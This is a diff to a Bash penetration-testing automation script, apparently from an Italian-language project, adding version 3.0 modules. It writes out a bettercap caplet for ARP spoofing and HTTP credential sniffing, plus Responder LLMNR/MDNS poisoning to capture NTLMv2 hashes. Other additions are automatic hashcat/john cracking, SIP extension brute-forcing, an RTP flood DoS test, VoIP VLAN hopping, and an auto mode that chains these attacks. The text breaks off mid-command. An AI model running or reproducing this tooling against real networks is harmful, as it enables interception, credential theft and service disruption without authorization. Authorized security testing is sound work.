@@ -34,13 +34,18 @@
 #    ldap    — LDAP enumeration (ldapsearch, nmap ldap NSE)
 #    post    — Post-exploitation + reverse shell (multi-vector)
 #    fw      — Firewall embedded analysis + bypass (ACK/FIN/frag/src-port/IPv6/UPnP/SIP-ALG)
+#    nuclei  — Nuclei CVE/template scanner (IoT, CVEs, panels, logins)
+#    mitm    — MITM framework (bettercap: ARP spoof, sniff, BLE)
+#    poison  — LLMNR/MDNS poisoning + hash crack (responder, hashcat/john)
+#    pivot   — HTTP tunneling + SOCKS5 proxy (chisel)
+#    vpn     — IPsec/IKE VPN enumeration (ike-scan)
 #    auto    — Auto-profile full assessment (tmux orchestration)
 #    report  — Generate text report from output dir
 # ============================================================
 
 set -euo pipefail
 
-VERSION="2.8.0"
+VERSION="3.0.0"
 SCRIPT_PATH="$(readlink -f "${BASH_SOURCE[0]}")"
 
 # ── Colori ──────────────────────────────────────────────────
@@ -1813,13 +1818,14 @@ usage_scan() {
 }
 
 cmd_scan() {
-    local target="" udp_top=20 do_full=1 do_vuln=0
+    local target="" udp_top=20 do_full=1 do_vuln=0 do_masscan=0
     while [[ $# -gt 0 ]]; do
         case "$1" in
             --stealth)   STEALTH=1;        shift ;;
             --udp-top)   _req_arg "$1" "${2:-}"; udp_top="$2";     shift 2 ;;
             --no-full)   do_full=0;        shift ;;
             --vuln)      do_vuln=1;        shift ;;
+            --masscan)   do_masscan=1;     shift ;;
             --timeout)   _req_arg "$1" "${2:-}"; TIMEOUT="$2"; validate_timeout "$2"; shift 2 ;;
             --output)    _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
             --dry-run)   DRY_RUN=1;        shift ;;
@@ -1834,6 +1840,45 @@ cmd_scan() {
     apply_stealth
     setup_outdir "$target" "scan"
     log "Target: $target | Output: $OUTDIR"
+
+    # ── Masscan pre-scan (reti /24 o flag --masscan) ─────────
+    # Attiva automaticamente se il target è una rete (contiene /) o se --masscan è passato
+    local _is_network=0
+    echo "$target" | grep -qE '/' && _is_network=1
+    if [[ $do_masscan -eq 1 || $_is_network -eq 1 ]]; then
+        section "Masscan pre-scan (porte 1-65535)"
+        if command -v masscan &>/dev/null; then
+            local _mscan_target="$target"
+            [[ $_is_network -eq 0 ]] && _mscan_target="${target}/32"
+            run_cmd "masscan" \
+                "masscan '$_mscan_target' -p 1-65535 --rate 10000 \
+                 -oJ '$OUTDIR/masscan.json' 2>&1 | tee '$OUTDIR/masscan.log' || true"
+            # Estrai porte trovate da masscan per passarle a nmap
+            if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/masscan.json" ]]; then
+                local _mscan_ports
+                _mscan_ports=$(python3 -c "
+import json,sys
+try:
+    data=json.load(open('$OUTDIR/masscan.json'))
+    ports=sorted(set(str(h['ports'][0]['port']) for h in data if h.get('ports')))
+    print(','.join(ports))
+except: pass
+" 2>/dev/null || \
+                    grep -oP '"port"\s*:\s*\K[0-9]+' "$OUTDIR/masscan.json" 2>/dev/null | \
+                    sort -un | tr '\n' ',' | sed 's/,$//' || true)
+                if [[ -n "$_mscan_ports" ]]; then
+                    log "  Masscan trovato porte: $_mscan_ports"
+                    found INFO "SCAN — masscan: porte aperte → $_mscan_ports"
+                    # Usa porte masscan come input per nmap -sV
+                    run_cmd "nmap_masscan_ports" \
+                        "nmap -sV -sC -p '$_mscan_ports' $NMAP_TIMING \
+                         -oA '$OUTDIR/nmap_masscan' $target 2>&1 | tee '$OUTDIR/nmap_masscan.log'"
+                fi
+            fi
+        else
+            warn "masscan non trovato — pre-scan rapido saltato (installa: apt install masscan)"
+        fi
+    fi
 
     section "ARP Scan"
     if require_tool arp-scan; then
@@ -1972,6 +2017,19 @@ cmd_web() {
         run_cmd "ssl_cert" \
             "echo | openssl s_client -connect '${target}:${port}' 2>/dev/null \
              | openssl x509 -text -noout 2>/dev/null | tee \"$OUTDIR\"/cert.txt"
+        # testssl.sh — analisi TLS completa
+        if command -v testssl.sh &>/dev/null || command -v testssl &>/dev/null; then
+            local _tssl_bin="testssl.sh"; command -v testssl.sh &>/dev/null || _tssl_bin="testssl"
+            run_cmd "testssl" \
+                "$_tssl_bin --color 0 --jsonfile '$OUTDIR/testssl.json' \
+                 --logfile '$OUTDIR/testssl.log' '${target}:${port}' 2>&1 | tail -20"
+            if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/testssl.log" ]]; then
+                grep -iE "CRITICAL|HIGH|MEDIUM|VULNERABLE|NOT ok" "$OUTDIR/testssl.log" 2>/dev/null | \
+                    while IFS= read -r _tline; do
+                        found MEDIUM "TLS — $_tline"
+                    done || true
+            fi
+        fi
     fi
 
     section "Web Vulnerability Scanner"
@@ -1995,13 +2053,35 @@ cmd_web() {
         run_cmd "nikto" "nikto $nikto_opts -output $OUTDIR/nikto.txt 2>&1"
     fi
 
-    section "Gobuster Directory Enum"
+    section "WAF Detection (wafw00f)"
+    if command -v wafw00f &>/dev/null; then
+        run_cmd "wafw00f" \
+            "wafw00f '${base_url}' -o '$OUTDIR/wafw00f.txt' 2>&1 | tee '$OUTDIR/wafw00f_stdout.txt' || true"
+        if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/wafw00f_stdout.txt" ]]; then
+            if grep -qiE "is behind|WAF" "$OUTDIR/wafw00f_stdout.txt" 2>/dev/null; then
+                local waf_name; waf_name=$(grep -oiE "behind [^\n]+" "$OUTDIR/wafw00f_stdout.txt" | head -1 || true)
+                found INFO "WEB — WAF rilevato: $waf_name"
+            else
+                log "  wafw00f: nessun WAF rilevato"
+            fi
+        fi
+    else
+        warn "wafw00f non trovato — installa: pip3 install wafw00f"
+    fi
+
+    section "Gobuster Directory Enum + ffuf"
     if require_tool gobuster && [[ -n "$wl" ]]; then
         local gb_opts="dir -u $base_url -w $wl -t $threads -q"
         [[ "$scheme" == "https" ]] && gb_opts="$gb_opts -k"
         run_cmd "gobuster" "gobuster $gb_opts 2>&1 | tee \"$OUTDIR\"/gobuster.txt"
+    elif tool_ok ffuf && [[ -n "$wl" ]]; then
+        run_cmd "ffuf_dir" \
+            "ffuf -u '${base_url}/FUZZ' -w '$wl' \
+             $([[ "$scheme" == "https" ]] && echo '-k') \
+             -mc 200,204,301,302,307,401,403 -t $threads \
+             -o '$OUTDIR/ffuf_dir.json' -of json 2>&1 | tail -10"
     elif [[ -z "$wl" ]]; then
-        warn "Wordlist web non trovata — gobuster saltato"
+        warn "Wordlist web non trovata — gobuster/ffuf saltati"
     fi
 
     section "Nmap HTTP NSE Scripts"
@@ -2392,6 +2472,76 @@ cmd_sip() {
         run_cmd "sip_enum_py" "python3 \"$sip_script\" $target --port $port --range ${ext_range:-100-500} --transport udp 2>&1 | tee \"$OUTDIR\"/sip_enum_py.txt"
     fi
 
+    # ── sippts — SIP pentest suite ────────────────────────────
+    section "SIP Pentest Suite (sippts)"
+    if command -v sippts &>/dev/null; then
+        run_cmd "sippts_scan" \
+            "sippts scan -i $target -fp -o '$OUTDIR/sippts_scan.txt' 2>&1 | tee '$OUTDIR/sippts_scan_log.txt' || true"
+        run_cmd "sippts_enum" \
+            "sippts enum -i $target -p $port -e ${ext_range:-100-300} \
+             -o '$OUTDIR/sippts_enum.txt' 2>&1 | tee '$OUTDIR/sippts_enum_log.txt' || true"
+        if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/sippts_enum.txt" ]]; then
+            grep -c "found\|200 OK\|register" "$OUTDIR/sippts_enum.txt" 2>/dev/null | \
+                { read n; [[ ${n:-0} -gt 0 ]] && \
+                    found HIGH "SIP — sippts: $n extension trovati (vedi $OUTDIR/sippts_enum.txt)"; } || true
+        fi
+        # sippts crack se wordlist disponibile
+        local wl; wl="${wordlist:-$(_wl_pass)}"
+        if [[ -s "$OUTDIR/sippts_enum.txt" ]]; then
+            run_cmd "sippts_crack" \
+                "sippts crack -i $target -p $port \
+                 -w '$wl' -o '$OUTDIR/sippts_crack.txt' \
+                 2>&1 | tee '$OUTDIR/sippts_crack_log.txt' || true"
+            if [[ $DRY_RUN -eq 0 && -s "$OUTDIR/sippts_crack.txt" ]]; then
+                grep -iE "password|cracked|found" "$OUTDIR/sippts_crack.txt" 2>/dev/null | \
+                    while IFS= read -r line; do found HIGH "SIP CRACK (sippts) — $line"; done || true
+            fi
+        fi
+    else
+        warn "sippts non trovato — installa: pip3 install sippts"
+    fi
+
+    # ── rtpflood — RTP DoS test ───────────────────────────────
+    section "RTP Flood DoS Test (rtpflood)"
+    if command -v rtpflood &>/dev/null; then
+        # RTP usa porte effimere, tipicamente 10000-20000
+        local rtp_port=10000
+        log "  rtpflood su $target:$rtp_port (100 pacchetti)"
+        if [[ $DRY_RUN -eq 0 ]]; then
+            run_cmd "rtpflood" \
+                "timeout 10 rtpflood $target $rtp_port 100 \
+                 2>&1 | tee '$OUTDIR/rtpflood.txt' || true"
+            [[ -s "$OUTDIR/rtpflood.txt" ]] && \
+                found MEDIUM "SIP/RTP — rtpflood: $target:$rtp_port risponde (DoS test applicabile)"
+        else
+            echo -e "${CYAN}[DRY-RUN]${NC} rtpflood $target $rtp_port 100"
+        fi
+    else
+        warn "rtpflood non trovato — test RTP DoS saltato"
+    fi
+
+    # ── voiphopper — VLAN hopping VoIP ───────────────────────
+    section "VoIP VLAN Hopping (voiphopper)"
+    if command -v voiphopper &>/dev/null; then
+        local _viface; _viface=$(ip route get "$target" 2>/dev/null | \
+            awk '/dev/{for(i=1;i<=NF;i++) if($i=="dev") print $(i+1)}' | head -1 || echo "eth0")
+        if [[ $DRY_RUN -eq 0 ]]; then
+            log "  voiphopper CDP sniff su $_viface (10s)"
+            run_cmd "voiphopper_cdp" \
+                "timeout 10 voiphopper -i '$_viface' -c 0 \
+                 2>&1 | tee '$OUTDIR/voiphopper_cdp.txt' || true"
+            if [[ -s "$OUTDIR/voiphopper_cdp.txt" ]]; then
+                grep -qiE "VLAN|CDP|voice" "$OUTDIR/voiphopper_cdp.txt" 2>/dev/null && \
+                    found HIGH "VoIP — VLAN hopping possibile: CDP/voice VLAN rilevata (voiphopper)"
+            fi
+        else
+            echo -e "${CYAN}[DRY-RUN]${NC} voiphopper -i $_viface -c 0  (CDP sniff)"
+            echo -e "${CYAN}[DRY-RUN]${NC} voiphopper -i $_viface -a    (auto VLAN hop)"
+        fi
+    else
+        warn "voiphopper non trovato — VLAN hopping test saltato"
+    fi
+
     ok "SIP audit completato → $OUTDIR"
 }
 
@@ -2562,6 +2712,28 @@ cmd_smb() {
         fi
     fi
 
+    # ── netexec (nxc) — SMB enum avanzato ────────────────────
+    section "netexec (nxc) SMB Enumeration"
+    if command -v nxc &>/dev/null || command -v netexec &>/dev/null; then
+        local _nxc_bin="nxc"; command -v nxc &>/dev/null || _nxc_bin="netexec"
+        run_cmd "nxc_smb_info" \
+            "$_nxc_bin smb $target 2>&1 | tee '$OUTDIR/nxc_smb_info.txt'"
+        run_cmd "nxc_shares" \
+            "$_nxc_bin smb $target --shares 2>&1 | tee '$OUTDIR/nxc_shares.txt' || true"
+        run_cmd "nxc_users" \
+            "$_nxc_bin smb $target --users 2>&1 | tee '$OUTDIR/nxc_users.txt' || true"
+        if [[ $DRY_RUN -eq 0 ]]; then
+            if [[ -f "$OUTDIR/nxc_smb_info.txt" ]]; then
+                grep -qiE "signing:False\|signing: False" "$OUTDIR/nxc_smb_info.txt" 2>/dev/null && \
+                    found HIGH "SMB — nxc: SMB signing disabilitato (relay attack possibile)"
+                grep -qiE "\[\+\]" "$OUTDIR/nxc_shares.txt" 2>/dev/null && \
+                    found MEDIUM "SMB — nxc: share accessibili trovati (vedi $OUTDIR/nxc_shares.txt)"
+            fi
+        fi
+    else
+        warn "netexec/nxc non trovato — installa: apt install netexec  o  pip3 install netexec"
+    fi
+
     ok "SMB audit completato → $OUTDIR"
 }
 
@@ -2712,6 +2884,72 @@ cmd_creds() {
         _cred_propagate "$target"
     fi
     _cred_store_summary
+
+    # ── Hash cracking — hashcat/john (post brute-force) ──────
+    section "Hash Crack (hashcat/john)"
+    local _hash_files=()
+    # Cerca hash file prodotti da moduli precedenti
+    while IFS= read -r -d '' _hf; do
+        _hash_files+=("$_hf")
+    done < <(find "$OUTDIR_BASE" -name "*.hash" -o -name "*hashes*.txt" \
+             -o -name "*ntlmv2*" -o -name "*ntlm*" 2>/dev/null -print0 || true)
+
+    local _wl_crack; _wl_crack=$(_wl_pass)
+
+    # Auto-detect tipo di hash e usa modalità corretta
+    _crack_hashfile() {
+        local _hf="$1"
+        [[ ! -s "$_hf" ]] && return 0
+        local _htype="0" _hname="MD5"
+        local _sample; _sample=$(head -1 "$_hf" 2>/dev/null || true)
+        # NTLMv2 (risponder format user::domain:...)
+        echo "$_sample" | grep -qP '^[^:]+::[^:]+:[0-9a-fA-F]{16}:[0-9a-fA-F]{32}:[0-9a-fA-F]+$' && \
+            { _htype="5600"; _hname="NTLMv2"; }
+        # NTLM (32 hex chars)
+        echo "$_sample" | grep -qP '^[0-9a-fA-F]{32}$' && { _htype="1000"; _hname="NTLM"; }
+        # SHA1 (40 hex)
+        echo "$_sample" | grep -qP '^[0-9a-fA-F]{40}$' && { _htype="100"; _hname="SHA1"; }
+        # MD5crypt $1$
+        echo "$_sample" | grep -qP '^\$1\$' && { _htype="500"; _hname="MD5crypt"; }
+        # bcrypt $2y$
+        echo "$_sample" | grep -qP '^\$2[aby]\$' && { _htype="3200"; _hname="bcrypt"; }
+        log "  Crack $_hname ($_hf) con hashcat mode $_htype"
+        if command -v hashcat &>/dev/null; then
+            run_cmd "hashcat_${_hname}" \
+                "hashcat -m $_htype '$_hf' '$_wl_crack' \
+                 --outfile '${_hf%.txt}_cracked.txt' -O --status-timer 10 \
+                 2>&1 | tail -10 || true"
+            if [[ -s "${_hf%.txt}_cracked.txt" ]]; then
+                while IFS= read -r _cline; do
+                    found CRITICAL "HASH CRACKED ($_hname) — $_cline"
+                done < "${_hf%.txt}_cracked.txt"
+            fi
+        elif command -v john &>/dev/null; then
+            run_cmd "john_${_hname}" \
+                "john --wordlist='$_wl_crack' '$_hf' 2>&1 | tee '${_hf%.txt}_john.log' || true"
+            run_cmd "john_show_${_hname}" \
+                "john --show '$_hf' 2>&1 | tee '${_hf%.txt}_john_cracked.txt'"
+            if [[ -s "${_hf%.txt}_john_cracked.txt" ]]; then
+                grep -v "^0 password" "${_hf%.txt}_john_cracked.txt" 2>/dev/null | \
+                    while IFS= read -r _jline; do
+                        found CRITICAL "HASH CRACKED john ($_hname) — $_jline"
+                    done || true
+            fi
+        else
+            warn "hashcat e john non trovati — installa: apt install hashcat john"
+        fi
+    }
+
+    if [[ ${#_hash_files[@]} -gt 0 ]]; then
+        for _hf in "${_hash_files[@]}"; do
+            _crack_hashfile "$_hf"
+        done
+    elif [[ $DRY_RUN -eq 1 ]]; then
+        echo -e "${CYAN}[DRY-RUN]${NC} hashcat -m <mode> <hashfile> <wordlist>"
+        echo -e "${CYAN}[DRY-RUN]${NC} john --wordlist=<wordlist> <hashfile>"
+    else
+        log "  Nessun file hash trovato — crack saltato"
+    fi
 
     ok "Creds test completato → $OUTDIR"
 }
@@ -9547,6 +9785,13 @@ cmd_auto() {
     _port_open 8443  && _run_mod "Web HTTPS :8443" web "$target" --port 8443 --scheme https && ran_enum=1
     # SSL/TLS
     { _port_open 443 || _port_open 8443; } && _run_mod "SSL/TLS" ssl "$target" && ran_enum=1
+    # Nuclei CVE/template scan — se porta HTTP disponibile
+    if { _port_open 80 || _port_open 443 || _port_open 8080 || _port_open 8443; } && \
+       command -v nuclei &>/dev/null; then
+        local _nuc_port=80; _port_open 443 && _nuc_port=443
+        _port_open 8080 && ! _port_open 80 && _nuc_port=8080
+        _run_mod "Nuclei CVE" nuclei "$target" --port "$_nuc_port" && ran_enum=1
+    fi
     # JS analysis — solo se almeno una porta web è aperta
     { _port_open 80 || _port_open 443 || _port_open 8080 || _port_open 8443; } && \
         _run_mod "JS analysis" js "$target" \
@@ -12094,6 +12339,29 @@ except: pass
         _atk "Metasploit check" msf "$target" --ports "$open_tcp" --output "$OUTDIR_BASE"
     fi
 
+    # ── MITM / ARP poisoning (bettercap) ──────────────────────────
+    if command -v bettercap &>/dev/null && [[ -n "${_iface:-}" ]]; then
+        log "  ▶ MITM bettercap (ARP spoof + sniff)"
+        ran_attack=1
+        _atk "MITM bettercap" mitm --iface "$_iface" --target "$target" \
+            --gateway "${_gw:-}" --output "$OUTDIR_BASE"
+    fi
+
+    # ── LLMNR/MDNS poisoning (responder) ──────────────────────────
+    if command -v responder &>/dev/null && [[ -n "${_iface:-}" ]]; then
+        log "  ▶ Responder LLMNR/MDNS poisoning"
+        ran_attack=1
+        _atk "Responder poison" poison --iface "$_iface" --duration 30 \
+            --output "$OUTDIR_BASE"
+    fi
+
+    # ── VPN/IKE enumeration (ike-scan) ────────────────────────────
+    if command -v ike-scan &>/dev/null; then
+        log "  ▶ IKE/IPsec VPN enum"
+        ran_attack=1
+        _atk "VPN IKE scan" vpn "$target" --output "$OUTDIR_BASE"
+    fi
+
     [[ $ran_attack -eq 0 ]] && warn "Nessun vettore di attacco identificato dai findings"
 
     # Propagazione credenziali trovate
@@ -13334,6 +13602,19 @@ cmd_self_test() {
         "redis-cli:redis-tools:Redis client"
         "sipsak:sipsak:SIP Swiss Army Knife"
         "nuclei:nuclei:Vulnerability scanner"
+        "bettercap:bettercap:MITM framework"
+        "responder:responder:LLMNR/MDNS poisoner"
+        "ike-scan:ike-scan:IPsec VPN scanner"
+        "masscan:masscan:Fast port scanner"
+        "hashcat:hashcat:GPU hash cracker"
+        "john:john:CPU password cracker"
+        "binwalk:binwalk:Firmware analyzer"
+        "hping3:hping3:Packet crafting"
+        "wafw00f:wafw00f:WAF detector"
+        "nxc:netexec:SMB/LDAP multi-tool (netexec)"
+        "voiphopper:voiphopper:VoIP VLAN hopper"
+        "sippts:sippts:SIP pentest suite"
+        "ffuf:ffuf:Fast web fuzzer"
     )
 
     local available=0 total=0 missing_tools=()
@@ -13653,6 +13934,498 @@ cmd_diff() {
 }
 
 # ============================================================
+#  SUBCOMMAND: nuclei — template-based CVE scanner
+# ============================================================
+usage_nuclei() {
+    echo "Uso: exa-dune nuclei <TARGET> [OPTIONS]"
+    echo ""
+    echo "  Nuclei template-based CVE/misconfiguration scanner"
+    echo "  Wraps: nuclei (ProjectDiscovery)"
+    echo ""
+    echo "  Template categories: iot, network, cves, exposed-panels, default-logins"
+    echo ""
+    echo "Opzioni:"
+    echo "  --port PORT        Porta (default: 80)"
+    echo "  --scheme SCHEME    http o https (default: http)"
+    echo "  --templates CATS   Categorie template separate da virgola (default: iot,cves,exposed-panels,default-logins)"
+    echo "  --severity SEVER   Severità minima (default: low,medium,high,critical)"
+    echo "  --output DIR"
+    echo "  --dry-run"
+}
+
+cmd_nuclei() {
+    local target="" port=80 scheme="http" templates="iot,cves,exposed-panels,default-logins,network"
+    local severity="low,medium,high,critical"
+    while [[ $# -gt 0 ]]; do
+        case "$1" in
+            --port)      _req_arg "$1" "${2:-}"; port="$2";       shift 2 ;;
+            --scheme)    _req_arg "$1" "${2:-}"; scheme="$2";     shift 2 ;;
+            --templates) _req_arg "$1" "${2:-}"; templates="$2";  shift 2 ;;
+            --severity)  _req_arg "$1" "${2:-}"; severity="$2";   shift 2 ;;
+            --output)    _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2";shift 2 ;;
+            --dry-run)   DRY_RUN=1;       shift ;;
+            --help|-h)   usage_nuclei; exit 0 ;;
+            -*)          err "Opzione sconosciuta: $1"; usage_nuclei; exit 1 ;;
+            *)           target="$1"; shift ;;
+        esac
+    done
+    [[ -z "$target" ]] && { err "TARGET mancante"; usage_nuclei; exit 1; }
+    validate_target "$target"
+    validate_port "$port"
+    setup_outdir "$target" "nuclei"
+    log "Target: ${scheme}://${target}:${port} | Output: $OUTDIR"
+    [[ $DRY_RUN -eq 1 ]] && return
+
+    if ! command -v nuclei &>/dev/null; then
+        warn "nuclei non trovato — installa: apt install nuclei  o  go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
+        return 0
+    fi
+
+    local nuclei_target="${scheme}://${target}:${port}"
+    local tpl_dir="/usr/share/nuclei-templates"
+    [[ ! -d "$tpl_dir" ]] && tpl_dir="$HOME/nuclei-templates"
+
+    # Costruisci argomenti tag categoria
+    local tag_args=""
+    IFS=',' read -ra _cats <<< "$templates"
+    for _cat in "${_cats[@]}"; do
+        tag_args="$tag_args -tags $_cat"
+    done
+
+    section "Nuclei CVE Scanner (categorie: $templates)"
+    local nuclei_out="$OUTDIR/nuclei_results.txt"
+    local nuclei_json="$OUTDIR/nuclei_results.json"
+
+    if [[ -d "$tpl_dir" ]]; then
+        run_cmd "nuclei" \
+            "nuclei -t '$tpl_dir' -u '$nuclei_target' -severity '$severity' \
+             $tag_args -duc -nh -no-verify \
+             -o '$nuclei_out' -je '$nuclei_json' 2>&1 | tail -20"
+    else
+        run_cmd "nuclei" \
+            "nuclei -u '$nuclei_target' -severity '$severity' \
+             $tag_args -duc -nh -no-verify \
+             -o '$nuclei_out' -je '$nuclei_json' 2>&1 | tail -20"
+    fi
+
+    if [[ -f "$nuclei_out" && -s "$nuclei_out" ]]; then
+        grep -iE "\[critical\]" "$nuclei_out" 2>/dev/null | \
+            while IFS= read -r line; do found CRITICAL "Nuclei — $line"; done || true
+        grep -iE "\[high\]" "$nuclei_out" 2>/dev/null | \
+            while IFS= read -r line; do found HIGH "Nuclei — $line"; done || true
+        grep -iE "\[medium\]" "$nuclei_out" 2>/dev/null | \
+            while IFS= read -r line; do found MEDIUM "Nuclei — $line"; done || true
+        grep -iE "\[low\]" "$nuclei_out" 2>/dev/null | \
+            while IFS= read -r line; do found LOW "Nuclei — $line"; done || true
+        local nc; nc=$(wc -l < "$nuclei_out" 2>/dev/null || echo 0)
+        ok "Nuclei: $nc finding(s) → $nuclei_out"
+    else
+        log "Nuclei: nessun finding"
+    fi
+}
+
+# ============================================================
+#  SUBCOMMAND: mitm — MITM framework (bettercap)
+# ============================================================
+usage_mitm() {
+    echo "Uso: exa-dune mitm <TARGET> [OPTIONS]"
+    echo ""
+    echo "  MITM framework: ARP spoofing, HTTP sniffing, credential capture, BLE"
+    echo "  Wraps: bettercap"
+    echo ""
+    echo "  ATTENZIONE: richiede root e interfaccia di rete attiva"
+    echo ""
+    echo "Opzioni:"
+    echo "  --iface IFACE      Interfaccia di rete (default: auto-detect)"
+    echo "  --gateway GW       Gateway IP (default: auto-detect da route)"
+    echo "  --duration SEC     Durata cattura in secondi (default: 120)"
+    echo "  --ble              Abilita scansione BLE"
+    echo "  --output DIR"
+    echo "  --dry-run"
+}
+
+cmd_mitm() {
+    local target="" iface="" gateway="" duration=120 do_ble=0
+    while [[ $# -gt 0 ]]; do
+        case "$1" in
+            --iface)    _req_arg "$1" "${2:-}"; iface="$2";    shift 2 ;;
+            --gateway)  _req_arg "$1" "${2:-}"; gateway="$2";  shift 2 ;;
+            --duration) _req_arg "$1" "${2:-}"; duration="$2"; shift 2 ;;
+            --ble)      do_ble=1; shift ;;
+            --output)   _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
+            --dry-run)  DRY_RUN=1; shift ;;
+            --help|-h)  usage_mitm; exit 0 ;;
+            -*)         err "Opzione sconosciuta: $1"; usage_mitm; exit 1 ;;
+            *)          target="$1"; shift ;;
+        esac
+    done
+    [[ -z "$target" ]] && { err "TARGET mancante"; usage_mitm; exit 1; }
+    validate_target "$target"
+    setup_outdir "$target" "mitm"
+    log "Target: $target | Output: $OUTDIR"
+
+    if ! command -v bettercap &>/dev/null; then
+        warn "bettercap non trovato — installa: apt install bettercap"
+        [[ $DRY_RUN -eq 1 ]] || return 0
+    fi
+
+    # Auto-detect interfaccia e gateway
+    if [[ -z "$iface" && $DRY_RUN -eq 0 ]]; then
+        iface=$(ip route get "$target" 2>/dev/null | awk '/dev/{for(i=1;i<=NF;i++) if($i=="dev") print $(i+1)}' | head -1 || echo "eth0")
+    fi
+    iface="${iface:-eth0}"
+    if [[ -z "$gateway" && $DRY_RUN -eq 0 ]]; then
+        gateway=$(ip route | awk '/default/{print $3; exit}' || true)
+    fi
+    gateway="${gateway:-$(echo "$target" | sed 's/\.[0-9]*$/.1/')}"
+
+    # Crea caplet bettercap
+    local caplet="$OUTDIR/mitm_${target//./-}.cap"
+    if [[ $DRY_RUN -eq 0 ]]; then
+        cat > "$caplet" << CAPLET_EOF
+# exa-dune mitm caplet — target: $target
+set arp.spoof.targets $target
+set arp.spoof.fullduplex true
+net.probe on
+arp.spoof on
+set net.sniff.verbose false
+set net.sniff.output $OUTDIR/sniff.pcap
+net.sniff on
+set http.proxy.script ''
+http.proxy on
+CAPLET_EOF
+        if [[ $do_ble -eq 1 ]]; then
+            echo "ble.recon on" >> "$caplet"
+        fi
+        ok "Caplet scritto → $caplet"
+    else
+        echo -e "${CYAN}[DRY-RUN]${NC} Caplet bettercap → $caplet"
+        echo -e "${CYAN}[DRY-RUN]${NC} bettercap -iface $iface -caplet $caplet"
+        return
+    fi
+
+    section "MITM ARP Spoofing (bettercap) — durata ${duration}s"
+    found MEDIUM "MITM — ARP spoofing avviato su $iface verso $target (gateway: $gateway)"
+    log "Avvio bettercap per ${duration}s — output: $OUTDIR/sniff.pcap"
+    run_cmd "bettercap" \
+        "timeout $duration bettercap -iface '$iface' -caplet '$caplet' \
+         2>&1 | tee '$OUTDIR/bettercap.log' || true"
+
+    section "Analisi credenziali catturate"
+    if [[ -f "$OUTDIR/bettercap.log" ]]; then
+        grep -iE "creds|credential|password|user|login|POST" "$OUTDIR/bettercap.log" 2>/dev/null \
+            | tee "$OUTDIR/captured_creds.txt" || true
+        if [[ -s "$OUTDIR/captured_creds.txt" ]]; then
+            found CRITICAL "MITM — credenziali HTTP catturate → $OUTDIR/captured_creds.txt"
+        fi
+    fi
+
+    ok "MITM completato → $OUTDIR"
+}
+
+# ============================================================
+#  SUBCOMMAND: poison — LLMNR/MDNS/NBT-NS poisoning + crack
+# ============================================================
+usage_poison() {
+    echo "Uso: exa-dune poison [OPTIONS]"
+    echo ""
+    echo "  LLMNR/MDNS/NBT-NS poisoning per cattura hash NTLMv2"
+    echo "  Wraps: responder, hashcat (GPU), john (CPU fallback)"
+    echo ""
+    echo "  ATTENZIONE: richiede root. Attivo sulla rete locale."
+    echo ""
+    echo "Opzioni:"
+    echo "  --iface IFACE      Interfaccia di rete (default: auto-detect)"
+    echo "  --duration SEC     Durata ascolto in secondi (default: 60)"
+    echo "  --wordlist FILE    Wordlist per crack hash (default: auto)"
+    echo "  --no-crack         Non tentare crack automatico degli hash"
+    echo "  --output DIR"
+    echo "  --dry-run"
+}
+
+cmd_poison() {
+    local iface="" duration=60 wordlist="" do_crack=1
+    while [[ $# -gt 0 ]]; do
+        case "$1" in
+            --iface)    _req_arg "$1" "${2:-}"; iface="$2";    shift 2 ;;
+            --duration) _req_arg "$1" "${2:-}"; duration="$2"; shift 2 ;;
+            --wordlist) _req_arg "$1" "${2:-}"; wordlist="$2"; shift 2 ;;
+            --no-crack) do_crack=0; shift ;;
+            --output)   _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
+            --dry-run)  DRY_RUN=1; shift ;;
+            --help|-h)  usage_poison; exit 0 ;;
+            -*)         err "Opzione sconosciuta: $1"; usage_poison; exit 1 ;;
+            *)          err "Argomento inaspettato: $1"; usage_poison; exit 1 ;;
+        esac
+    done
+
+    # Usa target "local" per outdir
+    local _poison_target="local_poison"
+    setup_outdir "$_poison_target" "poison"
+    log "Interfaccia: ${iface:-auto} | Durata: ${duration}s | Output: $OUTDIR"
+
+    if ! command -v responder &>/dev/null; then
+        warn "responder non trovato — installa: apt install responder"
+        [[ $DRY_RUN -eq 1 ]] || return 0
+    fi
+
+    # Auto-detect interfaccia
+    if [[ -z "$iface" && $DRY_RUN -eq 0 ]]; then
+        iface=$(ip route | awk '/default/{print $5; exit}' 2>/dev/null || echo "eth0")
+    fi
+    iface="${iface:-eth0}"
+
+    local wl; wl="${wordlist:-$(_wl_pass)}"
+
+    section "Responder LLMNR/MDNS/NBT-NS Poisoning (${duration}s su $iface)"
+    if [[ $DRY_RUN -eq 1 ]]; then
+        echo -e "${CYAN}[DRY-RUN]${NC} responder -I $iface -wrf -v (timeout ${duration}s)"
+        echo -e "${CYAN}[DRY-RUN]${NC} hashcat -m 5600 <hashfile> $wl"
+        return
+    fi
+
+    found MEDIUM "POISON — Responder attivato su $iface (LLMNR/MDNS/NBT-NS poisoning)"
+    run_cmd "responder" \
+        "timeout $duration responder -I '$iface' -wrf -v \
+         2>&1 | tee '$OUTDIR/responder.log' || true"
+
+    section "Parsing hash catturati da Responder"
+    # Responder scrive gli hash in /usr/share/responder/logs/ o ./logs/
+    local resp_log_dirs=("/usr/share/responder/logs" "/opt/responder/logs" "./logs" "$OUTDIR")
+    local hash_files=()
+    for _rdir in "${resp_log_dirs[@]}"; do
+        while IFS= read -r -d '' f; do
+            hash_files+=("$f")
+        done < <(find "$_rdir" -name "*NTLMv2*" -newer /proc/uptime 2>/dev/null -print0 || true)
+    done
+
+    if [[ ${#hash_files[@]} -gt 0 ]]; then
+        local combined_hashes="$OUTDIR/ntlmv2_hashes.txt"
+        cat "${hash_files[@]}" > "$combined_hashes" 2>/dev/null || true
+        local hcount; hcount=$(wc -l < "$combined_hashes" 2>/dev/null || echo 0)
+        found HIGH "POISON — $hcount hash NTLMv2 catturati → $combined_hashes"
+
+        if [[ $do_crack -eq 1 && $hcount -gt 0 ]]; then
+            section "Hash Crack NTLMv2"
+            if command -v hashcat &>/dev/null; then
+                log "Crack con hashcat (NTLMv2 = mode 5600)..."
+                run_cmd "hashcat_ntlmv2" \
